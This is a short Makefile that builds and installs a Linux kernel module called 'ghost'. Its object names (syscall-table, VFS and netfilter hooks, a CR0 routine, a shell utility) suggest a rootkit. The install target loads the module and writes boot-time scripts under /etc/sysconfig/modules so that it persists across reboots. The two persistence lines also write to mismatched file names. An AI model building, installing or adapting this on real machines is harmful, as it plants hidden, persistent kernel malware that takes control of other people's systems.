obj-m := ghost.o
ghost-objs := ghost_main.o netfilter_hook.o shellutil.o syscalltable.o vfs_hook.o cr0.o

KDIR := /lib/modules/$(shell uname -r)/build
DDIR := /lib/modules/$(shell uname -r)/kernel
CDIR := /etc/sysconfig/modules/extra

all:
	make -C $(KDIR) M=$(PWD) modules
clean:
	make -C $(KDIR) M=$(PWD) clean
install:
	cp ghost.ko $(DDIR)
	depmod
	modprobe ghost
	echo depmod > $(CDIR)/ghost.ko.modules
	echo modprobe ghost >> $(CDIR)/ghost.modules
	chmod 755 $(CDIR)/ghost.modules

